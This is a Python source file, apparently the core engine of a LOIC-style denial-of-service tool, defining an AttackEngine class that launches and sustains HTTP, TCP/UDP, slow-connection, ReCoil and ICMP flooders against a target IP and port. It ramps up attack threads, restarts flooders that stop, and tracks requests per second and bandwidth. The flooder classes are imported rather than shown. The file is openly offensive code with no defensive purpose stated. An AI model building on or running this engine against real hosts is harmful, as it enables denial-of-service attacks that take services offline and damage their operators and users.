from __future__ import annotations

import asyncio
import logging
import socket
import time
from typing import Optional

from loic.config import AttackConfig
from loic.protocol import Protocol
from loic.req_state import ReqState
from loic.flooders import (
    AsyncFlooder,
    HTTPFlooder,
    XXPFlooder,
    SlowLoic,
    ReCoil,
    ICMPFlooder,
)
from loic.metrics import MetricsCollector, MetricsSnapshot

logger = logging.getLogger(__name__)


class AttackEngine:
    def __init__(self, metrics_path=None, metrics_format="json"):
        self.config: AttackConfig = AttackConfig()
        self._flooders: list[AsyncFlooder] = []
        self._running: bool = False
        self._start_time: float = 0.0
        self._lock = asyncio.Lock()
        self._loop: asyncio.AbstractEventLoop | None = None
        self._ramp_tasks: list[asyncio.Task] = []
        self._stats_task: asyncio.Task | None = None
        self.metrics = MetricsCollector(
            export_path=metrics_path,
            export_format=metrics_format,
        )

    @property
    def is_running(self) -> bool:
        return self._running

    def _create_flooder(self, config: AttackConfig) -> Optional[AsyncFlooder]:
        if config.method == Protocol.HTTP:
            return HTTPFlooder(config)
        elif config.method in (Protocol.TCP, Protocol.UDP):
            return XXPFlooder(config)
        elif config.method == Protocol.SLOWLOIC:
            return SlowLoic(config)
        elif config.method == Protocol.RECOIL:
            return ReCoil(config)
        elif config.method == Protocol.ICMP:
            return ICMPFlooder(config)
        return None

    async def start(self, config: AttackConfig):
        async with self._lock:
            await self.stop()

            self.config = config
            self._running = True
            self._start_time = time.monotonic()
            self.metrics.start()
            self._flooders.clear()

            if config.ramp_up > 0:
                await self._start_ramp(config)
            else:
                for _ in range(config.threads):
                    f = self._create_flooder(config)
                    if f:
                        await f.start_async()
                        self._flooders.append(f)

            self._stats_task = asyncio.ensure_future(self._stats_loop())

        logger.info(
            "Attack started: %s:%d method=%s threads=%d",
            config.target_ip, config.port, config.method.label, config.threads,
        )

    async def _start_ramp(self, config: AttackConfig):
        interval = config.ramp_up / config.threads if config.threads > 0 else 0
        for i in range(config.threads):
            if not self._running:
                break
            f = self._create_flooder(config)
            if f:
                await f.start_async()
                self._flooders.append(f)
            if i < config.threads - 1:
                await asyncio.sleep(interval)

    async def stop(self):
        async with self._lock:
            self._running = False
            for f in self._flooders:
                f.stop()
            await asyncio.gather(*[f.stop_async() for f in self._flooders], return_exceptions=True)
            for f in self._flooders:
                await f.cleanup()
            self._flooders.clear()
            if self._stats_task and not self._stats_task.done():
                self._stats_task.cancel()
                try:
                    await self._stats_task
                except asyncio.CancelledError:
                    pass

        logger.info("Attack stopped")

    async def _stats_loop(self):
        while self._running:
            await asyncio.sleep(1.0)
            await self._collect_and_maintain()

    async def _collect_and_maintain(self):
        async with self._lock:
            snap = MetricsSnapshot()
            snap.is_flooding = self._running

            for f in self._flooders:
                snap.requested += f.requested
                snap.downloaded += f.downloaded
                snap.failed += f.failed
                snap.bytes_sent += f.bytes_sent
                snap.bytes_received += f.bytes_received
                for code, count in f.status_codes.items():
                    snap.status_codes[code] = snap.status_codes.get(code, 0) + count
                snap.avg_latency += f.avg_latency
                if f.state in (ReqState.IDLE, ReqState.COMPLETED):
                    snap.idle += 1
                elif f.state == ReqState.CONNECTING:
                    snap.connecting += 1
                elif f.state == ReqState.REQUESTING:
                    snap.requesting += 1
                elif f.state == ReqState.DOWNLOADING:
                    snap.downloading += 1

            if self._flooders:
                snap.avg_latency /= max(len(self._flooders), 1)

            self.metrics.record(snap)

            for i, f in enumerate(self._flooders):
                if self._running and not f.is_flooding:
                    f.stop()
                    new_f = self._create_flooder(self.config)
                    if new_f:
                        await new_f.start_async()
                        self._flooders[i] = new_f

            while len(self._flooders) < self.config.threads and self._running:
                new_f = self._create_flooder(self.config)
                if new_f:
                    await new_f.start_async()
                    self._flooders.append(new_f)
                else:
                    break

            while len(self._flooders) > self.config.threads:
                f = self._flooders.pop()
                f.stop()

    def get_stats(self) -> MetricsSnapshot:
        snap = MetricsSnapshot()
        snap.is_flooding = self._running
        for f in self._flooders:
            snap.requested += f.requested
            snap.downloaded += f.downloaded
            snap.failed += f.failed
            snap.bytes_sent += f.bytes_sent
            snap.bytes_received += f.bytes_received
            for code, count in f.status_codes.items():
                snap.status_codes[code] = snap.status_codes.get(code, 0) + count
            snap.avg_latency += f.avg_latency
            if f.state in (ReqState.IDLE, ReqState.COMPLETED):
                snap.idle += 1
            elif f.state == ReqState.CONNECTING:
                snap.connecting += 1
            elif f.state == ReqState.REQUESTING:
                snap.requesting += 1
            elif f.state == ReqState.DOWNLOADING:
                snap.downloading += 1
        if self._flooders:
            snap.avg_latency /= max(len(self._flooders), 1)
        if self._start_time > 0:
            snap.elapsed = time.monotonic() - self._start_time
            if snap.elapsed > 0:
                snap.req_per_sec = snap.requested / snap.elapsed
                snap.bandwidth_out = snap.bytes_sent / snap.elapsed
                snap.bandwidth_in = snap.bytes_received / snap.elapsed
        return snap

    @staticmethod
    def resolve_ip(host: str, ipv6: bool = False) -> tuple[str, str]:
        family = socket.AF_INET6 if ipv6 else socket.AF_INET
        try:
            results = socket.getaddrinfo(host, None, family, socket.SOCK_STREAM)
            ip = results[0][4][0]
            display = ip
            if ":" in display:
                display = f"[{display.strip('[]')}]"
            return ip, display
        except socket.gaierror:
            raise ValueError(f"Could not resolve host: {host}")

    @staticmethod
    def resolve_url(url: str, ipv6: bool = False) -> tuple[str, str]:
        from urllib.parse import urlparse
        if "://" not in url:
            url = f"http://{url}"
        parsed = urlparse(url)
        host = parsed.hostname or ""
        ip, display = AttackEngine.resolve_ip(host, ipv6)
        return ip, host